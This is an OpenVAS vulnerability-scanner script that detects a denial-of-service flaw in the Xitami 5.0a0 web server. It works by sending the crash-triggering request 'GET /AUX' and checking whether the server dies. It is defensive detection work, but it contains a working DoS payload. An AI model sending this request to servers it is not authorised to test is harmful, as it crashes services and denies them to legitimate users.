###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xitami_40027.nasl 4803 2016-12-19 13:00:35Z mime $
#
# Xitami '/AUX' Request Remote Denial Of Service Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100633");
  script_version("$Revision: 4803 $");
  script_tag(name:"last_modification", value:"$Date: 2016-12-19 14:00:35 +0100 (Mon, 19 Dec 2016) $");
  script_tag(name:"creation_date", value:"2010-05-11 20:07:01 +0200 (Tue, 11 May 2010)");
  script_bugtraq_id(40027);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Xitami '/AUX' Request Remote Denial Of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/40027");
  script_xref(name:"URL", value:"http://www.imatix.com/products");

  tag_summary = "Xitami is prone to a denial-of-service vulnerability.";

  tag_impact = "Attackers can exploit this issue to crash the affected application,
  denying service to legitimate users.";

  tag_affected = "Xitami 5.0a0 is vulnerable.";

  script_tag(name:"summary" , value:tag_summary);
  script_tag(name:"impact" , value:tag_impact);
  script_tag(name:"affected" , value:tag_affected);

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");

port = get_http_port( default:80 );

if( http_is_dead( port:port, retry:4 ) ) exit( 0 );

req = string("GET /AUX HTTP/1.0\r\n\r\n" );
http_send_recv( port:port, data:req );

sleep( 2 );

if( http_is_dead( port:port, retry:4 ) ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );
